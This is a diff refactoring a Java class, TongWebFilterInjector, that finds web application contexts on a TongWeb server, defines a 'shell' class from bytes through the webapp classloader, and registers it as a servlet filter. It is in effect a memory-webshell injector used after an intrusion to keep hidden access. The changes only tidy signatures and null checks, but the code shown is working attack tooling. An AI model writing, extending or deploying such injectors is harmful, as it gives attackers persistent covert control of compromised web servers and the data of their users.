@@ -19,7 +19,7 @@ import java.util.zip.GZIPInputStream;
 public class TongWebFilterInjector {
 
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -35,14 +35,12 @@ public class TongWebFilterInjector {
         } catch (Throwable throwable) {
             
         }
-        if (contexts == null || contexts.isEmpty()) {
-            
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                  
-                    Object shell = getShell(context);
-                    inject(context, shell);
+                    loadShell(context);
+                    inject(context);
                  
                 } catch (Throwable e) {
                    
@@ -105,9 +103,9 @@ public class TongWebFilterInjector {
     }
 
     
-    private Object getShell(Object context) throws Exception {
+    private void loadShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
@@ -117,11 +115,11 @@ public class TongWebFilterInjector {
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
         
-        return clazz.newInstance();
+        clazz.newInstance();
     }
 
     
-    public void inject(Object context, Object filter) throws Exception {
+    private void inject(Object context) throws Exception {
         if (invokeMethod(context, "findFilterDef", new Class[]{String.class}, new Object[]{shellClassName}) != null) {
             return;
         }
